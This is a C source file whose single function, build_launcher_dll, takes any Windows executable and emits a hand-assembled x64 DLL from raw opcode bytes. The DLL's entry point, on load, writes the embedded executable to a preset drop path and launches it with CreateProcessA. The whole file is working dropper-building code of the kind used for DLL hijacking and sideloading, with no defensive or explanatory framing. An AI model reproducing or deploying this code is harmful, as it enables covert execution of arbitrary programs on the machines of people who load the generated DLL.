#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input_file = INVALID_HANDLE_VALUE;
    HANDLE output_file = INVALID_HANDLE_VALUE;
    unsigned char *binary = NULL;
    unsigned char *section = NULL;
    unsigned char *headers = NULL;
    LARGE_INTEGER file_size;
    DWORD binary_size;
    size_t path_length;
    size_t capacity;
    size_t code_used = 0;
    size_t path_offset;
    size_t binary_offset;
    size_t import_offset;
    size_t oft_offset;
    size_t iat_offset;
    size_t names_offset;
    size_t section_used;
    size_t raw_size;
    size_t file_offset;
    size_t branch_patch;
    size_t drop_patch[2];
    size_t call_patch[4];
    size_t i;
    size_t startup_zero_offsets[] = {
        0x58, 0x60, 0x68, 0x70, 0x78, 0x80,
        0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0
    };
    const char *drop_path = DROP_PATH;
    const char *import_names[4] = {
        "CreateFileA", "WriteFile", "CloseHandle", "CreateProcessA"
    };
    const char module_name[] = "KERNEL32.dll";
    DWORD bytes_read;
    DWORD bytes_written;
    BOOL output_created = FALSE;
    int result = -1;
    uint32_t image_size;
    uint32_t raw_size32;
    uint32_t section_used32;
    unsigned char *p;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_SECTION_HEADER *sh;
    IMAGE_IMPORT_DESCRIPTOR *descriptor;
    IMAGE_THUNK_DATA64 *oft;
    IMAGE_THUNK_DATA64 *iat;

    if (binary_path == NULL || dll_out_path == NULL || drop_path == NULL)
        return -1;

    path_length = strlen(drop_path);
    if (path_length == 0 || path_length > SIZE_MAX - 16384)
        return -1;

    input_file = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input_file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input_file, &file_size) || file_size.QuadPart <= 0 ||
        file_size.QuadPart > UINT32_MAX)
        goto cleanup;

    binary_size = (DWORD)file_size.QuadPart;
    binary = (unsigned char *)malloc((size_t)binary_size);
    if (binary == NULL)
        goto cleanup;

    file_offset = 0;
    while (file_offset < (size_t)binary_size) {
        DWORD chunk = (DWORD)(((size_t)binary_size - file_offset) > MAXDWORD
                                  ? MAXDWORD
                                  : ((size_t)binary_size - file_offset));
        if (!ReadFile(input_file, binary + file_offset, chunk, &bytes_read, NULL) ||
            bytes_read == 0)
            goto cleanup;
        file_offset += bytes_read;
    }

    if (!CloseHandle(input_file)) {
        input_file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input_file = INVALID_HANDLE_VALUE;

    if ((size_t)binary_size > SIZE_MAX - path_length - 16384)
        goto cleanup;
    capacity = (size_t)binary_size + path_length + 16384;
    section = (unsigned char *)calloc(1, capacity);
    headers = (unsigned char *)calloc(1, 0x400);
    if (section == NULL || headers == NULL)
        goto cleanup;

#define EMIT(...) do { \
        const unsigned char emit_bytes[] = { __VA_ARGS__ }; \
        if (code_used > capacity || sizeof(emit_bytes) > capacity - code_used) \
            goto cleanup; \
        memcpy(section + code_used, emit_bytes, sizeof(emit_bytes)); \
        code_used += sizeof(emit_bytes); \
    } while (0)
#define EMIT_U32(value) do { \
        uint32_t emit_value = (uint32_t)(value); \
        EMIT((unsigned char)(emit_value), \
             (unsigned char)(emit_value >> 8), \
             (unsigned char)(emit_value >> 16), \
             (unsigned char)(emit_value >> 24)); \
    } while (0)
#define ALIGN8(value) (((value) + 7u) & ~(size_t)7u)

    EMIT(0x83, 0xfa, 0x01, 0x0f, 0x85);
    branch_patch = code_used;
    EMIT_U32(0);

    EMIT(0x48, 0x81, 0xec, 0xd8, 0x00, 0x00, 0x00);

    EMIT(0x48, 0x8d, 0x0d);
    drop_patch[0] = code_used;
    EMIT_U32(0);
    EMIT(0xba, 0x00, 0x00, 0x00, 0x40);
    EMIT(0x45, 0x33, 0xc0);
    EMIT(0x45, 0x33, 0xc9);
    EMIT(0xc7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00);
    EMIT(0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00);
    EMIT(0x48, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00);
    EMIT(0xff, 0x15);
    call_patch[0] = code_used;
    EMIT_U32(0);

    EMIT(0x48, 0x89, 0x44, 0x24, 0x38);
    EMIT(0x48, 0x8b, 0x4c, 0x24, 0x38);
    EMIT(0x48, 0x8d, 0x15);
    {
        size_t binary_patch = code_used;
        EMIT_U32(0);
        EMIT(0x41, 0xb8);
        EMIT_U32(binary_size);
        EMIT(0x4c, 0x8d, 0x4c, 0x24, 0x40);
        EMIT(0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00);
        EMIT(0xff, 0x15);
        call_patch[1] = code_used;
        EMIT_U32(0);

        EMIT(0x48, 0x8b, 0x4c, 0x24, 0x38);
        EMIT(0xff, 0x15);
        call_patch[2] = code_used;
        EMIT_U32(0);

        EMIT(0x48, 0x8d, 0x0d);
        drop_patch[1] = code_used;
        EMIT_U32(0);
        EMIT(0x31, 0xd2);
        EMIT(0x45, 0x33, 0xc0);
        EMIT(0x45, 0x33, 0xc9);
        EMIT(0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00);
        EMIT(0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00);
        EMIT(0x48, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00);
        EMIT(0x48, 0xc7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00);
        EMIT(0x48, 0x8d, 0x44, 0x24, 0x50);
        EMIT(0x48, 0x89, 0x44, 0x24, 0x40);
        EMIT(0x48, 0x8d, 0x44, 0x24, 0xb8);
        EMIT(0x48, 0x89, 0x44, 0x24, 0x48);
        EMIT(0xc7, 0x44, 0x24, 0x50, 0x68, 0x00, 0x00, 0x00);

        for (i = 0; i < sizeof(startup_zero_offsets) / sizeof(startup_zero_offsets[0]); ++i) {
            unsigned char offset = (unsigned char)startup_zero_offsets[i];
            EMIT(0x48, 0xc7, 0x44, 0x24, offset, 0x00, 0x00, 0x00, 0x00);
        }

        EMIT(0xff, 0x15);
        call_patch[3] = code_used;
        EMIT_U32(0);
        EMIT(0x48, 0x81, 0xc4, 0xd8, 0x00, 0x00, 0x00);
        EMIT(0xb8, 0x01, 0x00, 0x00, 0x00);
        EMIT(0xc3);

        {
            size_t return_offset = code_used;
            EMIT(0xb8, 0x01, 0x00, 0x00, 0x00);
            EMIT(0xc3);

            {
                int64_t displacement = (int64_t)return_offset -
                                       (int64_t)(branch_patch + 4);
                if (displacement < INT32_MIN || displacement > INT32_MAX)
                    goto cleanup;
                {
                    int32_t d = (int32_t)displacement;
                    memcpy(section + branch_patch, &d, sizeof(d));
                }
            }
        }

        path_offset = ALIGN8(code_used);
        if (path_offset > capacity || path_length + 1 > capacity - path_offset)
            goto cleanup;
        memcpy(section + path_offset, drop_path, path_length + 1);

        binary_offset = ALIGN8(path_offset + path_length + 1);
        if (binary_offset > capacity ||
            (size_t)binary_size > capacity - binary_offset)
            goto cleanup;
        memcpy(section + binary_offset, binary, binary_size);

        import_offset = ALIGN8(binary_offset + (size_t)binary_size);
        oft_offset = ALIGN8(import_offset + 2 * sizeof(IMAGE_IMPORT_DESCRIPTOR));
        iat_offset = ALIGN8(oft_offset + 5 * sizeof(IMAGE_THUNK_DATA64));
        names_offset = ALIGN8(iat_offset + 5 * sizeof(IMAGE_THUNK_DATA64));
        if (names_offset > capacity)
            goto cleanup;

        {
            size_t name_offsets[4];
            size_t cursor = names_offset;
            size_t module_offset;
            size_t k;

            if (sizeof(module_name) > capacity - cursor)
                goto cleanup;
            module_offset = cursor;
            memcpy(section + cursor, module_name, sizeof(module_name));
            cursor += sizeof(module_name);

            for (k = 0; k < 4; ++k) {
                size_t name_length = strlen(import_names[k]) + 1;
                cursor = ALIGN8(cursor);
                if (cursor > capacity || name_length + sizeof(WORD) > capacity - cursor)
                    goto cleanup;
                name_offsets[k] = cursor;
                *(WORD *)(void *)(section + cursor) = 0;
                memcpy(section + cursor + sizeof(WORD), import_names[k], name_length);
                cursor += sizeof(WORD) + name_length;
            }
            section_used = cursor;

            descriptor = (IMAGE_IMPORT_DESCRIPTOR *)(void *)(section + import_offset);
            descriptor[0].OriginalFirstThunk = (DWORD)(0x1000u + oft_offset);
            descriptor[0].Name = (DWORD)(0x1000u + module_offset);
            descriptor[0].FirstThunk = (DWORD)(0x1000u + iat_offset);

            oft = (IMAGE_THUNK_DATA64 *)(void *)(section + oft_offset);
            iat = (IMAGE_THUNK_DATA64 *)(void *)(section + iat_offset);
            for (k = 0; k < 4; ++k) {
                uint64_t name_rva = (uint64_t)(0x1000u + name_offsets[k]);
                oft[k].u1.AddressOfData = name_rva;
                iat[k].u1.AddressOfData = name_rva;
            }

            for (k = 0; k < 2; ++k) {
                int64_t displacement = (int64_t)(0x1000u + path_offset) -
                                       (int64_t)(drop_patch[k] + 4);
                if (displacement < INT32_MIN || displacement > INT32_MAX)
                    goto cleanup;
                {
                    int32_t d = (int32_t)displacement;
                    memcpy(section + drop_patch[k], &d, sizeof(d));
                }
            }

            {
                int64_t displacement = (int64_t)(0x1000u + binary_offset) -
                                       (int64_t)(binary_patch + 4);
                if (displacement < INT32_MIN || displacement > INT32_MAX)
                    goto cleanup;
                {
                    int32_t d = (int32_t)displacement;
                    memcpy(section + binary_patch, &d, sizeof(d));
                }
            }

            for (k = 0; k < 4; ++k) {
                int64_t displacement = (int64_t)(0x1000u + iat_offset + k * 8) -
                                       (int64_t)(call_patch[k] + 4);
                if (displacement < INT32_MIN || displacement > INT32_MAX)
                    goto cleanup;
                {
                    int32_t d = (int32_t)displacement;
                    memcpy(section + call_patch[k], &d, sizeof(d));
                }
            }
        }
    }

    if (section_used > UINT32_MAX || section_used > SIZE_MAX - 0x1ff)
        goto cleanup;
    section_used32 = (uint32_t)section_used;
    raw_size = (section_used + 0x1ffu) & ~(size_t)0x1ffu;
    if (raw_size > UINT32_MAX || raw_size > capacity)
        goto cleanup;
    raw_size32 = (uint32_t)raw_size;
    if (section_used > SIZE_MAX - 0xfff)
        goto cleanup;
    if (((0x1000u + section_used + 0xfffu) & ~(size_t)0xfffu) > UINT32_MAX)
        goto cleanup;
    image_size = (uint32_t)((0x1000u + section_used + 0xfffu) & ~(size_t)0xfffu);

    dos = (IMAGE_DOS_HEADER *)(void *)headers;
    dos->e_magic = IMAGE_DOS_SIGNATURE;
    dos->e_lfanew = sizeof(IMAGE_DOS_HEADER);

    nt = (IMAGE_NT_HEADERS64 *)(void *)(headers + sizeof(IMAGE_DOS_HEADER));
    nt->Signature = IMAGE_NT_SIGNATURE;
    nt->FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
    nt->FileHeader.NumberOfSections = 1;
    nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    nt->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE |
                                     IMAGE_FILE_DLL |
                                     IMAGE_FILE_RELOCS_STRIPPED |
                                     IMAGE_FILE_LARGE_ADDRESS_AWARE;

    nt->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    nt->OptionalHeader.MajorLinkerVersion = 1;
    nt->OptionalHeader.AddressOfEntryPoint = 0x1000;
    nt->OptionalHeader.BaseOfCode = 0x1000;
    nt->OptionalHeader.ImageBase = 0x180000000ULL;
    nt->OptionalHeader.SectionAlignment = 0x1000;
    nt->OptionalHeader.FileAlignment = 0x200;
    nt->OptionalHeader.MajorOperatingSystemVersion = 6;
    nt->OptionalHeader.MajorSubsystemVersion = 6;
    nt->OptionalHeader.SizeOfImage = image_size;
    nt->OptionalHeader.SizeOfHeaders = 0x400;
    nt->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI;
    nt->OptionalHeader.DllCharacteristics = IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
    nt->OptionalHeader.SizeOfStackReserve = 0x100000;
    nt->OptionalHeader.SizeOfStackCommit = 0x1000;
    nt->OptionalHeader.SizeOfHeapReserve = 0x100000;
    nt->OptionalHeader.SizeOfHeapCommit = 0x1000;
    nt->OptionalHeader.NumberOfRvaAndSizes = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
    nt->OptionalHeader.SizeOfCode = raw_size32;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress =
        (DWORD)(0x1000u + import_offset);
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size =
        2 * sizeof(IMAGE_IMPORT_DESCRIPTOR);

    sh = IMAGE_FIRST_SECTION(nt);
    memcpy(sh->Name, ".text", 5);
    sh->Misc.VirtualSize = section_used32;
    sh->VirtualAddress = 0x1000;
    sh->SizeOfRawData = raw_size32;
    sh->PointerToRawData = 0x400;
    sh->Characteristics = IMAGE_SCN_CNT_CODE |
                          IMAGE_SCN_CNT_INITIALIZED_DATA |
                          IMAGE_SCN_MEM_EXECUTE |
                          IMAGE_SCN_MEM_READ |
                          IMAGE_SCN_MEM_WRITE;

    output_file = CreateFileA(dll_out_path, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (output_file == INVALID_HANDLE_VALUE)
        goto cleanup;
    output_created = TRUE;

#define WRITE_ALL(buffer, length) do { \
        const unsigned char *write_ptr = (const unsigned char *)(buffer); \
        size_t write_length = (size_t)(length); \
        size_t write_offset = 0; \
        while (write_offset < write_length) { \
            DWORD write_chunk = (DWORD)((write_length - write_offset) > MAXDWORD \
                                            ? MAXDWORD \
                                            : (write_length - write_offset)); \
            if (!WriteFile(output_file, write_ptr + write_offset, write_chunk, \
                           &bytes_written, NULL) || bytes_written == 0) \
                goto cleanup; \
            write_offset += bytes_written; \
        } \
    } while (0)

    WRITE_ALL(headers, 0x400);
    WRITE_ALL(section, raw_size);
    if (!FlushFileBuffers(output_file))
        goto cleanup;
    if (!CloseHandle(output_file)) {
        output_file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    output_file = INVALID_HANDLE_VALUE;
    output_created = FALSE;
    result = 0;

cleanup:
    if (input_file != INVALID_HANDLE_VALUE)
        CloseHandle(input_file);
    if (output_file != INVALID_HANDLE_VALUE)
        CloseHandle(output_file);
    if (output_created)
        DeleteFileA(dll_out_path);
    free(binary);
    free(section);
    free(headers);
#undef WRITE_ALL
#undef ALIGN8
#undef EMIT_U32
#undef EMIT
    return result;
}